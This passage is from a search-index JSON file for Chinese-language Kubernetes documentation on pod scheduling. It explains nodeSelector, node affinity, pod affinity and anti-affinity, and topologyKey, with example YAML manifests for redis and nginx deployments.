\u88ab\u6b63\u786e\u7684\u8c03\u5ea6\u5230\u4e86140\u8282\u70b9\u3002\u901a\u8fc7\u4e0a\u9762\u7684\u4f8b\u5b50\u6211\u4eec\u53ef\u4ee5\u611f\u53d7\u5230 nodeSelector \u7684\u65b9\u5f0f\u6bd4\u8f83\u76f4\u89c2\uff0c\u4f46\u662f\u8fd8\u591f\u7075\u6d3b\uff0c\u63a7\u5236\u7c92\u5ea6\u504f\u5927","title":"nodeSelector"},{"location":"lxc/kubernetes/dispatch/#node-affinity","text":"\u8282\u70b9\u4eb2\u548c\u6027\uff08node affinity\uff09\u7684\u6982\u5ff5\u4e0e nodeSelector \u76f8\u4f3c\uff0c\u53ef\u4ee5\u57fa\u4e8e\u8282\u70b9\u7684\u6807\u7b7e\u6765\u9650\u5b9a Pod \u53ef\u4ee5\u88ab\u8c03\u5ea6\u5230\u54ea\u4e9b\u8282\u70b9\u4e0a\u3002 \u5f53\u524d\u652f\u6301\u4e24\u79cd\u7c7b\u578b\u7684\u8282\u70b9\u4eb2\u548c\u6027\uff0c requiredDuringSchedulingIgnoredDuringExecution \uff08hard\uff0c\u76ee\u6807\u8282\u70b9\u5fc5\u987b\u6ee1\u8db3\u6b64\u6761\u4ef6\uff09 \u4ee5\u53ca preferredDuringSchedulingIgnoredDuringExecution \uff08soft\uff0c\u76ee\u6807\u8282\u70b9\u6700\u597d\u80fd\u6ee1\u8db3\u6b64\u6761\u4ef6\uff09\u3002\u540d\u5b57\u4e2d IgnoredDuringExecution \u610f\u5473\u7740\uff1a\u5982\u679c Pod \u5df2\u7ecf\u8c03\u5ea6\u5230\u8282\u70b9\u4e0a\u4ee5\u540e\uff0c\u8282\u70b9\u7684\u6807\u7b7e\u53d1\u751f\u6539\u53d8\uff0c\u4f7f\u5f97\u8282\u70b9\u5df2\u7ecf\u4e0d\u518d\u5339\u914d\u8be5\u4eb2\u548c\u6027\u89c4\u5219\u4e86\uff0cPod \u4ecd\u5c06\u7ee7\u7eed\u5728\u8282\u70b9\u4e0a\u6267\u884c\uff08\u8fd9\u4e00\u70b9\u4e0e nodeSelector \u76f8\u4f3c\uff09\u3002\u5c06\u6765\uff0cKubernetes \u5c06\u4f1a\u63d0\u4f9b requiredDuringSchedulingRequiredDuringExecution \u8fd9\u4e2a\u9009\u9879\uff0c\u8be5\u9009\u9879\u4e0e requiredDuringSchedulingIgnoredDuringExecution \u76f8\u4f3c\uff0c\u4e0d\u540c\u7684\u662f\uff0c\u5f53\u8282\u70b9\u7684\u6807\u7b7e\u4e0d\u5728\u5339\u914d\u4eb2\u548c\u6027\u89c4\u5219\u4e4b\u540e\uff0cPod \u5c06\u88ab\u4ece\u8282\u70b9\u4e0a\u9a71\u9010\u3002 requiredDuringSchedulingIgnoredDuringExecution \u7684\u4e00\u4e2a\u4f8b\u5b50\u662f\uff0c \u53ea\u5728 Intel CPU \u4e0a\u8fd0\u884c\u8be5 Pod \uff0c preferredDuringSchedulingIgnoredDuringExecution \u7684\u4e00\u4e2a\u4f8b\u5b50\u662f\uff0c \u5c3d\u91cf\u5728\u9ad8\u53ef\u7528\u533a XYZ \u4e2d\u8fd0\u884c\u8fd9\u4e2a Pod\uff0c\u4f46\u662f\u5982\u679c\u505a\u4e0d\u5230\uff0c\u4e5f\u53ef\u4ee5\u5728\u5176\u4ed6\u5730\u65b9\u8fd0\u884c\u8be5 Pod \u3002 PodSpec \u4e2d\u901a\u8fc7 affinity.nodeAffinity \u5b57\u6bb5\u6765\u5b9a\u4e49\u8282\u70b9\u4eb2\u548c\u6027\uff0c\u793a\u4f8b\u6587\u4ef6\u5982\u4e0b\uff1a apiVersion: v1 kind: Pod metadata: name: with-node-affinity spec: affinity: nodeAffinity: requiredDuringSchedulingIgnoredDuringExecution: nodeSelectorTerms: - matchExpressions: - key: kubernetes.io/e2e-az-name operator: In values: - e2e-az1 - e2e-az2 preferredDuringSchedulingIgnoredDuringExecution: - weight: 1 preference: matchExpressions: - key: another-node-label-key operator: In values: - another-node-label-value containers: - name: with-node-affinity image: k8s.gcr.io/pause:2.0 \u6b64\u5904\u7684\u4eb2\u548c\u6027\u89c4\u5219\u8868\u660e\uff0c\u8be5 Pod \u53ea\u80fd\u88ab\u8c03\u5ea6\u5230\u5305\u542b key \u4e3a kubernetes.io/e2e-az-name \u4e14 value \u4e3a e2e-az1 \u6216 e2e-az2 \u7684\u6807\u7b7e\u7684\u8282\u70b9\u4e0a\u3002\u6b64\u5916\uff0c\u5982\u679c\u8282\u70b9\u5df2\u7ecf\u6ee1\u8db3\u4e86\u524d\u8ff0\u6761\u4ef6\uff0c\u5c06\u4f18\u5148\u9009\u62e9\u5305\u542b key \u4e3a another-node-label-key \u4e14 value \u4e3a another-node-label-value \u7684\u6807\u7b7e\u7684\u8282\u70b9\u3002 \u4f8b\u5b50\u4e2d\u4f7f\u7528\u4e86\u64cd\u4f5c\u7b26 In \u3002\u8282\u70b9\u4eb2\u548c\u6027\u652f\u6301\u5982\u4e0b\u64cd\u4f5c\u7b26\uff1a In \u3001 NotIn \u3001 Exists \u3001 DoesNotExist \u3001 Gt \u3001 Lt \u3002\u4f7f\u7528 NotIn \u548c DoesNotExist \u53ef\u4ee5\u5b9e\u73b0\u8282\u70b9\u53cd\u4eb2\u548c\u6027\uff08node anti-affinity\uff09\u7684\u6548\u679c\uff0c\u6216\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528 \u6c61\u70b9 \u4e3a\u8282\u70b9\u6392\u65a5\u67d0\u7c7b Pod\u3002 In\uff1alabel \u7684\u503c\u5728\u67d0\u4e2a\u5217\u8868\u4e2d NotIn\uff1alabel \u7684\u503c\u4e0d\u5728\u67d0\u4e2a\u5217\u8868\u4e2d Gt\uff1alabel \u7684\u503c\u5927\u4e8e\u67d0\u4e2a\u503c Lt\uff1alabel \u7684\u503c\u5c0f\u4e8e\u67d0\u4e2a\u503c Exists\uff1a\u67d0\u4e2a label \u5b58\u5728 DoesNotExist\uff1a\u67d0\u4e2a label \u4e0d\u5b58\u5728 \u5982\u679c\u67d0\u4e2a Pod \u540c\u65f6\u6307\u5b9a\u4e86 nodeSelector \u548c nodeAffinity \uff0c\u5219\u76ee\u6807\u8282\u70b9\u5fc5\u987b\u540c\u65f6\u6ee1\u8db3\u4e24\u4e2a\u6761\u4ef6\uff0c\u624d\u80fd\u5c06 Pod \u8c03\u5ea6\u5230\u8be5\u8282\u70b9\u4e0a\u3002 \u5982\u679c\u4e3a nodeAffinity \u6307\u5b9a\u591a\u4e2a nodeSelectorTerms \uff0c\u5219\u76ee\u6807\u8282\u70b9\u53ea\u9700\u8981\u6ee1\u8db3\u4efb\u610f\u4e00\u4e2a nodeSelectorTerms \u7684\u8981\u6c42\uff0c\u5c31\u53ef\u4ee5\u5c06 Pod \u8c03\u5ea6\u5230\u8be5\u8282\u70b9\u4e0a\u3002 \u5982\u679c\u4e3a nodeSelectorTerms \u6307\u5b9a\u591a\u4e2a matchExpressions \uff0c\u5219\u76ee\u6807\u8282\u70b9\u5fc5\u987b\u6ee1\u8db3\u6240\u6709\u7684 matchExpressions \u7684\u8981\u6c42\uff0c\u624d\u80fd\u5c06 Pod \u8c03\u5ea6\u5230\u8be5\u8282\u70b9\u4e0a\u3002 \u5f53 Pod \u88ab\u8c03\u5ea6\u5230\u67d0\u8282\u70b9\u4e0a\u4e4b\u540e\uff0c\u5982\u679c\u79fb\u9664\u6216\u8005\u4fee\u6539\u8282\u70b9\u7684\u6807\u7b7e\uff0cPod \u5c06\u4ecd\u7136\u7ee7\u7eed\u5728\u8282\u70b9\u4e0a\u8fd0\u884c\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u8282\u70b9\u4eb2\u548c\u6027\u89c4\u5219\u53ea\u5728\u8c03\u5ea6\u8be5 Pod \u65f6\u53d1\u751f\u4f5c\u7528\u3002 preferredDuringSchedulingIgnoredDuringExecution \u4e2d\u7684 weight \u5b57\u6bb5\u53d6\u503c\u8303\u56f4\u4e3a 1-100\u3002\u5bf9\u4e8e\u6bcf\u4e00\u4e2a\u6ee1\u8db3\u8c03\u5ea6\u8981\u6c42\u7684\u8282\u70b9\uff08\u8d44\u6e90\u8bf7\u6c42\u3001\u4eb2\u548c\u6027/\u53cd\u4eb2\u548c\u6027\u89c4\u5219\uff0c\u7b49\uff09\uff0c\u8c03\u5ea6\u5668\u5c06\u904d\u5386\u8be5\u8282\u70b9\u5339\u914d\u7684 preferredDuringSchedulingIgnoredDuringExecution \u4e2d\u6240\u6709\u7684 weight \u5e76\u6c42\u548c\u3002\u6b64\u6c42\u548c\u7ed3\u679c\u5c06\u4e0e\u8282\u70b9\u7684\u5176\u4ed6\u4f18\u5148\u7ea7\u8ba1\u7b97\u7684\u5f97\u5206\u5408\u5e76\u3002\u5f97\u5206\u6700\u9ad8\u7684\u8282\u70b9\u88ab\u4f18\u5148\u9009\u62e9\u3002","title":"node affinity"},{"location":"lxc/kubernetes/dispatch/#pod","text":"Pod\u4e4b\u95f4\u7684\u4eb2\u548c\u6027\u4e0e\u53cd\u4eb2\u548c\u6027\uff08inter-pod affinity and anti-affinity\uff09\u53ef\u4ee5\u57fa\u4e8e\u5df2\u7ecf\u8fd0\u884c\u5728\u8282\u70b9\u4e0a\u7684 Pod \u7684\u6807\u7b7e\uff08\u800c\u4e0d\u662f\u8282\u70b9\u7684\u6807\u7b7e\uff09\u6765\u9650\u5b9a Pod \u53ef\u4ee5\u88ab\u8c03\u5ea6\u5230\u54ea\u4e2a\u8282\u70b9\u4e0a\u3002\u6b64\u7c7b\u89c4\u5219\u7684\u8868\u73b0\u5f62\u5f0f\u662f\uff1a \u5f53 X \u5df2\u7ecf\u8fd0\u884c\u4e86\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u6ee1\u8db3\u89c4\u5219 Y \u7684 Pod \u65f6\uff0c\u5f85\u8c03\u5ea6\u7684 Pod \u5e94\u8be5\uff08\u6216\u8005\u4e0d\u5e94\u8be5 - \u53cd\u4eb2\u548c\u6027\uff09\u5728 X \u4e0a\u8fd0\u884c \u89c4\u5219 Y \u4ee5 LabelSelector \u7684\u5f62\u5f0f\u8868\u8ff0\uff0c\u9644\u5e26\u4e00\u4e2a\u53ef\u9009\u7684\u540d\u79f0\u7a7a\u95f4\u5217\u8868 \u4e0e\u8282\u70b9\u4e0d\u4e00\u6837\uff0cPod \u662f\u5728\u540d\u79f0\u7a7a\u95f4\u4e2d\u7684\uff08\u56e0\u6b64\uff0cPod\u7684\u6807\u7b7e\u662f\u5728\u540d\u79f0\u7a7a\u95f4\u4e2d\u7684\uff09\uff0c\u9488\u5bf9 Pod \u7684 LabelSelector \u5fc5\u987b\u540c\u65f6\u6307\u5b9a\u5bf9\u5e94\u7684\u540d\u79f0\u7a7a\u95f4 X \u662f\u4e00\u4e2a\u62d3\u6251\u57df\u7684\u6982\u5ff5\uff0c\u4f8b\u5982\u8282\u70b9\u3001\u673a\u67dc\u3001\u4e91\u4f9b\u5e94\u5546\u53ef\u7528\u533a\u3001\u4e91\u4f9b\u5e94\u5546\u5730\u57df\uff0c\u7b49\u3002X \u4ee5 topologyKey \u7684\u5f62\u5f0f\u8868\u8fbe\uff0c\u8be5 Key\u4ee3\u8868\u4e86\u8282\u70b9\u4e0a\u4ee3\u8868\u62d3\u6251\u57df\uff08topology domain\uff09\u7684\u4e00\u4e2a\u6807\u7b7e\u3002","title":"Pod\u4eb2\u548c\u6027\u4e0e\u53cd\u4eb2\u548c\u6027"},{"location":"lxc/kubernetes/dispatch/#pod-affinity","text":"apiVersion: v1 kind: Pod metadata: name: with-pod-affinity spec: affinity: podAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchExpressions: - key: security operator: In values: - S1 topologyKey: failure-domain.beta.kubernetes.io/zone podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: security operator: In values: - S2 topologyKey: failure-domain.beta.kubernetes.io/zone containers: - name: with-pod-affinity image: k8s.gcr.io/pause:2.0 \u8be5 Pod \u7684 affinity \u5b9a\u4e49\u4e86\u4e00\u4e2a Pod \u4eb2\u548c\u6027\u89c4\u5219\u548c\u4e00\u4e2a Pod \u53cd\u4eb2\u548c\u6027\u89c4\u5219\uff0c\u4f8b\u5b50\u4e2d\uff0c podAffinity \u662f requiredDuringSchedulingIgnoredDuringExecution \uff0c\u800c podAntiAffinity \u5219\u662f preferredDuringSchedulingIgnoredDuringExecution \u3002 Pod \u4eb2\u548c\u6027\u89c4\u5219\u8981\u6c42\uff0c\u8be5 Pod \u53ef\u4ee5\u88ab\u8c03\u5ea6\u5230\u7684\u8282\u70b9\u6240\u5728\u7684\u53ef\u7528\u533a zone \u5fc5\u987b\u5df2\u7ecf\u6709\u4e00\u4e2a\u5df2\u7ecf\u8fd0\u884c\u7684 Pod \u5305\u542b\u6807\u7b7e key=security\uff0cvalue=S1\uff0c\u6216\u8005\u66f4\u51c6\u786e\u5730\u8bf4\uff0c\u8282\u70b9\u5fc5\u987b\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6\uff1a \u8282\u70b9\u5305\u542b key \u4e3a failure-domain.beta.kubernetes.io/zone \u7684\u6807\u7b7e\uff0c\u5047\u8bbe\u8be5\u6807\u7b7e\u7684\u503c\u4e3a V \u81f3\u5c11\u6709\u4e00\u4e2a\u5305\u542b key \u4e3a failure-domain.beta.kubernetes.io/zone \u4e14 value \u4e3a V \u7684\u6807\u7b7e\u7684\u8282\u70b9\u5df2\u7ecf\u8fd0\u884c\u4e86\u4e00\u4e2a\u5305\u542b\u6807\u7b7e key \u4e3a security \u4e14 value \u4e3a S1 \u7684 Pod Pod \u53cd\u4eb2\u548c\u6027\u89c4\u5219\u8981\u6c42\uff0c\u8be5 Pod \u6700\u597d\u4e0d\u8981\u88ab\u8c03\u5ea6\u5230\u5df2\u7ecf\u8fd0\u884c\u4e86\u5305\u542b key \u4e3a security \u4e14 value \u4e3a S2 \u7684\u6807\u7b7e\u7684 Pod \u7684\u8282\u70b9\u4e0a\uff0c\u6216\u8005\u66f4\u51c6\u786e\u5730\u8bf4\uff0c\u5fc5\u987b\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6\uff1a \u5982\u679c topologyKey \u662f failure-domain.beta.kubernetes.io/zone \uff0c\u5219\uff0cPod\u4e0d\u80fd\u88ab\u8c03\u5ea6\u5230\u540c\u4e00\u4e2a zone \u4e2d\u7684\u5df2\u7ecf\u8fd0\u884c\u4e86\u5305\u542b\u6807\u7b7e security: S2 \u7684\u8282\u70b9\u4e0a \u53c2\u8003 design doc (opens new window) \u53ef\u4ee5\u4e86\u89e3\u66f4\u591a Pod \u4eb2\u548c\u6027\u4e0e\u53cd\u4eb2\u548c\u6027\u7684\u4f8b\u5b50\u3002 \u539f\u5219\u4e0a\uff0c topologyKey \u53ef\u4ee5\u662f\u4efb\u4f55\u5408\u6cd5\u7684\u6807\u7b7e key\u3002\u7136\u800c\uff0c\u5904\u4e8e\u6027\u80fd\u548c\u5b89\u5168\u7684\u8003\u8651\uff0c\u4ecd\u7136\u5bf9 topologyKey \u6709\u5982\u4e0b\u9650\u5236\uff1a \u5bf9\u4eb2\u548c\u6027\u4ee5\u53ca requiredDuringSchedulingIgnoredDuringExecution Pod \u53cd\u4eb2\u548c\u6027\uff0c topologyKey \u4e0d\u80fd\u4e3a\u7a7a \u5bf9 requiredDuringSchedulingIgnoredDuringExecution Pod \u53cd\u4eb2\u548c\u6027\uff0c\u7ba1\u7406\u63a7\u5236\u5668 LimitPodHardAntiAffinityTopology \u88ab\u7528\u6765\u9650\u5236 topologyKey \u5fc5\u987b\u4e3a kubernetes.io/hostname \u3002\u5982\u679c\u60f3\u8981\u4f7f\u7528\u5176\u4ed6\u7684\u81ea\u5b9a\u4e49 topology\uff0c\u5fc5\u987b\u4fee\u6539\u8be5\u7ba1\u7406\u63a7\u5236\u5668\uff0c\u6216\u8005\u5c06\u5176\u7981\u7528 \u5bf9 preferredDuringSchedulingIgnoredDuringExecution Pod \u53cd\u4eb2\u548c\u6027\uff0c\u5982\u679c topologyKey \u4e3a\u7a7a\uff0c\u5219\u4ee3\u8868\u6240\u6709\u7684 topology \uff08\u6b64\u65f6\uff0c\u4e0d\u5c40\u9650\u4e8e kubernetes.io/hostname \u3001 failure-domain.beta.kubernetes.io/zone \u548c failure-domain.beta.kubernetes.io/region \u7684\u7ec4\u5408\uff09 \u9664\u4e86\u4e0a\u8ff0\u7684\u60c5\u5f62\u4ee5\u5916\uff0c topologyKey \u53ef\u4ee5\u662f\u4efb\u4f55\u5408\u6cd5\u7684\u6807\u7b7e Key \u9664\u4e86 labelSelector \u548c topologyKey \u4ee5\u5916\uff0c\u8fd8\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2a namespaces \u7684\u5217\u8868\uff0c\u7528\u4f5c labelSelector \u7684\u4f5c\u7528\u8303\u56f4\uff08\u4e0e labelSelector \u548c topologyKey \u7684\u5b9a\u4e49\u4e3a\u540c\u4e00\u4e2a\u7ea7\u522b\uff09\u3002\u5982\u679c\u4e0d\u5b9a\u4e49\u6216\u8005\u8be5\u5b57\u6bb5\u4e3a\u7a7a\uff0c\u9ed8\u8ba4\u4e3a Pod \u6240\u5728\u7684\u540d\u79f0\u7a7a\u95f4\u3002 \u6240\u6709\u4e0e requiredDuringSchedulingIgnoredDuringExecution \u4eb2\u548c\u6027\u548c\u53cd\u4eb2\u548c\u6027\u5173\u8054\u7684 matchExpressions \u5fc5\u987b\u88ab\u6ee1\u8db3\uff0cPod \u624d\u80fd\u88ab\u8c03\u5ea6\u5230\u76ee\u6807\u8282\u70b9\u3002","title":"pod affinity \u7684\u4e00\u4e2a\u4f8b\u5b50"},{"location":"lxc/kubernetes/dispatch/#topologykey","text":"\u987e\u540d\u601d\u4e49\uff0c topology \u5c31\u662f \u62d3\u6251 \u7684\u610f\u601d\uff0c\u8fd9\u91cc\u6307\u7684\u662f\u4e00\u4e2a \u62d3\u6251\u57df \uff0c\u662f\u6307\u4e00\u4e2a\u8303\u56f4\u7684\u6982\u5ff5\uff0c\u6bd4\u5982\u4e00\u4e2a Node\u3001\u4e00\u4e2a\u673a\u67dc\u3001\u4e00\u4e2a\u673a\u623f\u6216\u8005\u662f\u4e00\u4e2a\u5730\u533a\uff08\u5982\u676d\u5dde\u3001\u4e0a\u6d77\uff09\u7b49\uff0c\u5b9e\u9645\u4e0a\u5bf9\u5e94\u7684\u8fd8\u662f Node \u4e0a\u7684\u6807\u7b7e\u3002\u8fd9\u91cc\u7684 topologyKey \u5bf9\u5e94\u7684\u662f Node \u4e0a\u7684\u6807\u7b7e\u7684 Key\uff08\u6ca1\u6709Value\uff09\uff0c\u53ef\u4ee5\u770b\u51fa\uff0c\u5176\u5b9e topologyKey \u5c31\u662f\u7528\u4e8e\u7b5b\u9009 Node \u7684\u3002\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5c06\u5404\u4e2a Pod \u8fdb\u884c\u8de8\u96c6\u7fa4\u3001\u8de8\u673a\u623f\u3001\u8de8\u5730\u533a\u7684\u8c03\u5ea6\u4e86\u3002","title":"\u4ec0\u4e48\u662ftopologyKey"},{"location":"lxc/kubernetes/dispatch/#topologykey_1","text":"\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\uff1a apiVersion: v1 kind: Pod metadata: name: with-pod-affinity spec: affinity: podAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchExpressions: - key: security operator: In values: - S1 topologyKey: failure-domain.beta.kubernetes.io/zone podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: security operator: In values: - S2 topologyKey: kubernetes.io/hostname containers: - name: with-pod-affinity image: k8s.gcr.io/pause:2.0 \u8fd9\u91cc Pod \u7684\u4eb2\u548c\u6027\u89c4\u5219\u662f\uff1a\u8fd9\u4e2a Pod \u8981\u8c03\u5ea6\u5230\u7684 Node \u5fc5\u987b\u6709\u4e00\u4e2a\u6807\u7b7e\u4e3a security: S1 \u7684 Pod\uff0c\u4e14\u8be5 Node \u5fc5\u987b\u6709\u4e00\u4e2a Key \u4e3a failure-domain.beta.kubernetes.io/zone \u7684 \u6807\u7b7e\uff0c\u5373 Node \u5fc5\u987b\u5c5e\u4e8e failure-domain.beta.kubernetes.io/zone \u62d3\u6251\u57df\u3002 Pod \u7684\u53cd\u4eb2\u548c\u6027\u89c4\u5219\u662f\uff1a\u8fd9\u4e2a Pod \u5c3d\u91cf\u4e0d\u8981\u8c03\u5ea6\u5230\u8fd9\u6837\u7684 Node\uff0c\u5176\u5305\u542b\u4e00\u4e2a Key \u4e3a kubernetes.io/hostname \u7684\u6807\u7b7e\uff0c\u4e14\u8be5 Node \u4e0a\u6709\u6807\u7b7e\u4e3a security: S2 \u7684 Pod\u3002","title":"\u5982\u4f55\u4f7f\u7528topologyKey"},{"location":"lxc/kubernetes/dispatch/#topologykey_2","text":"\u65e2\u7136 topologyKey \u662f\u62d3\u6251\u57df\uff0c\u90a3 Pod \u4e4b\u95f4\u600e\u6837\u624d\u662f\u5c5e\u4e8e\u540c\u4e00\u4e2a\u62d3\u6251\u57df\uff1f \u5982\u679c\u4f7f\u7528 k8s.io/hostname \uff0c\u5219\u8868\u793a\u62d3\u6251\u57df\u4e3a Node \u8303\u56f4\uff0c\u90a3\u4e48 k8s.io/hostname \u5bf9\u5e94\u7684\u503c\u4e0d\u4e00\u6837\u5c31\u662f\u4e0d\u540c\u7684\u62d3\u6251\u57df\u3002\u6bd4\u5982 Pod1 \u5728 k8s.io/hostname=node1 \u7684 Node \u4e0a\uff0cPod2 \u5728 k8s.io/hostname=node2 \u7684 Node \u4e0a\uff0cPod3 \u5728 k8s.io/hostname=node1 \u7684 Node \u4e0a\uff0c\u5219 Pod2 \u548c Pod1\u3001Pod3 \u4e0d\u5728\u540c\u4e00\u4e2a\u62d3\u6251\u57df\uff0c\u800cPod1 \u548c Pod3\u5728\u540c\u4e00\u4e2a\u62d3\u6251\u57df\u3002 \u5982\u679c\u4f7f\u7528 failure-domain.k8s.io/zone \uff0c\u5219\u8868\u793a\u62d3\u6251\u57df\u4e3a\u4e00\u4e2a\u533a\u57df\u3002\u540c\u6837\uff0cNode \u7684\u6807\u7b7e failure-domain.k8s.io/zone \u5bf9\u5e94\u7684\u503c\u4e0d\u4e00\u6837\u4e5f\u4e0d\u662f\u540c\u4e00\u4e2a\u62d3\u6251\u57df\uff0c\u6bd4\u5982 Pod1 \u5728 failure-domain.k8s.io/zone=beijing \u7684 Node \u4e0a\uff0cPod2 \u5728 failure-domain.k8s.io/zone=hangzhou \u7684 Node \u4e0a\uff0c\u5219 Pod1 \u548c Pod2 \u4e0d\u5c5e\u4e8e\u540c\u4e00\u4e2a\u62d3\u6251\u57df\u3002 \u5f53\u7136\uff0ctopologyKey \u4e5f\u53ef\u4ee5\u4f7f\u7528\u81ea\u5b9a\u4e49\u6807\u7b7e\u3002\u6bd4\u5982\u53ef\u4ee5\u7ed9\u4e00\u7ec4 Node \u6253\u4e0a\u6807\u7b7e custom_topology \uff0c\u90a3\u4e48\u62d3\u6251\u57df\u5c31\u662f\u9488\u5bf9\u8fd9\u4e2a\u6807\u7b7e\u4e86\uff0c\u5219\u8be5\u6807\u7b7e\u76f8\u540c\u7684 Node \u4e0a\u7684 Pod \u5c5e\u4e8e\u540c\u4e00\u4e2a\u62d3\u6251\u57df\u3002","title":"topologyKey\u8be6\u89e3"},{"location":"lxc/kubernetes/dispatch/#_1","text":"\u539f\u5219\u4e0a\uff0ctopologyKey \u53ef\u4ee5\u662f\u4efb\u4f55\u5408\u6cd5\u7684\u6807\u7b7e Key\u3002\u4f46\u662f\u51fa\u4e8e\u6027\u80fd\u548c\u5b89\u5168\u539f\u56e0\uff0c\u5bf9 topologyKey \u6709\u4e00\u4e9b\u9650\u5236\uff1a \u5bf9\u4e8e\u4eb2\u548c\u6027\u548c requiredDuringSchedulingIgnoredDuringExecution \u7684 Pod \u53cd\u4eb2\u548c\u6027\uff0ctopologyKey \u4e0d\u80fd\u4e3a\u7a7a\u3002 \u5bf9\u4e8e requiredDuringSchedulingIgnoredDuringExecution \u7684 Pod \u53cd\u4eb2\u548c\u6027\uff0c\u5f15\u5165 LimitPodHardAntiAffinityTopology \u51c6\u5165\u63a7\u5236\u5668\u6765\u9650\u5236 topologyKey \u53ea\u80fd\u662f kubernetes.io/hostname \u3002\u5982\u679c\u8981\u4f7f\u7528\u81ea\u5b9a\u4e49\u62d3\u6251\u57df\uff0c\u5219\u53ef\u4ee5\u4fee\u6539\u51c6\u5165\u63a7\u5236\u5668\uff0c\u6216\u8005\u76f4\u63a5\u7981\u7528\u5b83\u3002 \u5bf9\u4e8e preferredDuringSchedulingIgnoredDuringExecution \u7684 Pod \u53cd\u4eb2\u548c\u6027\uff0c\u7a7a\u7684 topologyKey \u8868\u793a\u6240\u6709\u62d3\u6251\u57df\u3002\u622a\u6b62 v1.12 \u7248\u672c\uff0c\u6240\u6709\u62d3\u6251\u57df\u8fd8\u53ea\u80fd\u662f kubernetes.io/hostname \u3001 failure-domain.beta.kubernetes.io/zone \u548c failure-domain.beta.kubernetes.io/region \u7684\u7ec4\u5408\u3002 \u9664\u4e0a\u8ff0\u60c5\u51b5\u5916\uff0ctopologyKey \u53ef\u4ee5\u662f\u4efb\u4f55\u5408\u6cd5\u7684\u6807\u7b7e key\u3002","title":"\u6ce8\u610f\u4e8b\u9879"},{"location":"lxc/kubernetes/dispatch/#_2","text":"Pod \u4eb2\u548c\u6027\u4e0e\u53cd\u4eb2\u548c\u6027\u7ed3\u5408\u9ad8\u7ea7\u522b\u63a7\u5236\u5668\uff08\u4f8b\u5982 ReplicaSet\u3001StatefulSet\u3001Deployment \u7b49\uff09\u4e00\u8d77\u4f7f\u7528\u65f6\uff0c\u53ef\u4ee5\u975e\u5e38\u5b9e\u7528\u3002\u6b64\u65f6\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u5c06\u4e00\u7ec4\u5de5\u4f5c\u590d\u6742\u8c03\u5ea6\u5230\u540c\u4e00\u4e2a topology\uff0c\u4f8b\u5982\uff0c\u540c\u4e00\u4e2a\u8282\u70b9\u3002","title":"\u66f4\u591a\u5b9e\u7528\u7684\u4f8b\u5b50"},{"location":"lxc/kubernetes/dispatch/#_3","text":"\u5728\u4e00\u4e2a\u4e09\u8282\u70b9\u7684\u96c6\u7fa4\u4e2d\uff0c\u90e8\u7f72\u4e00\u4e2a\u4f7f\u7528 redis \u7684 web \u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u671f\u671b web-server \u5c3d\u53ef\u80fd\u4e0e redis \u5728\u540c\u4e00\u4e2a\u8282\u70b9\u4e0a\u3002 \u4e0b\u9762\u662f redis deployment \u7684 yaml \u7247\u6bb5\uff0c\u5305\u542b\u4e09\u4e2a\u526f\u672c\u4ee5\u53ca app=store \u6807\u7b7e\u9009\u62e9\u5668\u3002Deployment \u4e2d\u914d\u7f6e\u4e86 PodAntiAffinity \uff0c\u786e\u4fdd\u8c03\u5ea6\u5668\u4e0d\u4f1a\u5c06\u4e09\u4e2a\u526f\u672c\u8c03\u5ea6\u5230\u4e00\u4e2a\u8282\u70b9\u4e0a\uff1a apiVersion: apps/v1 kind: Deployment metadata: name: redis-cache spec: selector: matchLabels: app: store replicas: 3 template: metadata: labels: app: store spec: affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchExpressions: - key: app operator: In values: - store topologyKey: \"kubernetes.io/hostname\" containers: - name: redis-server image: redis:3.2-alpine \u4e0b\u9762\u662f webserver deployment \u7684 yaml \u7247\u6bb5\uff0c\u914d\u7f6e\u4e86 podAntiAffinity \u4ee5\u53ca podAffinity \u3002\u8981\u6c42\u5c06\u5176\u526f\u672c\u4e0e \u5305\u542b app=store \u6807\u7b7e\u7684 Pod \u653e\u5728\u540c\u4e00\u4e2a\u8282\u70b9\u4e0a\uff1b\u540c\u65f6\u4e5f\u8981\u6c42 web-server \u7684\u526f\u672c\u4e0d\u88ab\u8c03\u5ea6\u5230\u540c\u4e00\u4e2a\u8282\u70b9\u4e0a\u3002 apiVersion: apps/v1 kind: Deployment metadata: name: web-server spec: selector: matchLabels: app: web-store replicas: 3 template: metadata: labels: app: web-store spec: affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchExpressions: - key: app operator: In values: - web-store topologyKey: \"kubernetes.io/hostname\" podAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchExpressions: - key: app operator: In values: - store topologyKey: \"kubernetes.io/hostname\" containers: - name: web-app image: nginx:1.12-alpine \u5982\u679c\u521b\u5efa\u4e0a\u8ff0\u4e24\u4e2a deployment\uff0c\u96c6\u7fa4\u5c06\u5982\u4e0b\u6240\u793a\uff1a Node-1 Node-2 Node-3 web-server-1 webserver-2 webserver-3 cache-1 cache-2 cache-3 web-server \u7684\u4e09\u4e2a\u526f\u672c\u90fd\u81ea\u52a8\u4e0e cach \u7684\u526f\u672c\u8fd0\u884c\u5728\u76f8\u540c\u7684\u8282\u70b9\u4e0a\u3002 kubectl get pods -o wide \u8f93\u51fa\u7ed3\u679c\u5982\u4e0b\u6240\u793a NAME READY STATUS RESTARTS AGE IP NODE redis-cache-1450370735-6dzlj 1/1 Running 0 8m 10.192.4.2 kube-node-3 redis-cache-1450370735-j2j96 1/1 Running 0 8m 10.192.2.2 kube-node-1 redis-cache-1450370735-z73mh 1/1 Running 0 8m 10.192.3.1 kube-node-2 web-server-1287567482-5d4dz 1/1 